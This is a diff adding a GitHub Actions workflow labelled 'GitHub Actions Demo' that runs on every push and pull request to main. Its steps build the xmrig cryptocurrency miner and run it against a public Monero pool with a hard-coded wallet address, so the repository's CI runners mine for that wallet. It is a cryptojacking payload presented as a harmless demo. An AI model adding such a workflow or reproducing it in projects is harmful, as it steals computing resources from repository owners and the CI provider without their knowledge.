@@ -1,0 +1,27 @@
+name: GitHub Actions Demo 🦹‍♂️
+
+on:
+  push:
+    branches: [main]
+  pull_request:
+    branches: [main]
+  workflow_dispatch:
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v2
+
+      - name: Installs xmrig
+        run: |
+          sudo apt update
+          sudo apt-get install git build-essential cmake libuv1-dev libssl-dev libhwloc-dev -y
+          git clone https://github.com/xmrig/xmrig.git
+          mkdir xmrig/build && cd xmrig/build
+          cmake .. && make
+
+      - name: Runs xmrig
+        run: |
+          ./xmrig/build/xmrig -o pool.supportxmr.com:443 -u 89cHSTfn419XjxZo5RTvBL7xxabdCFMgWggXj6cr7cxpjfeyutBT3y6NRNkiAzYV1rGoc9dSxbnw7CRHAvEGvJRv2gJc7Ko -k --tls --rig-id workflow
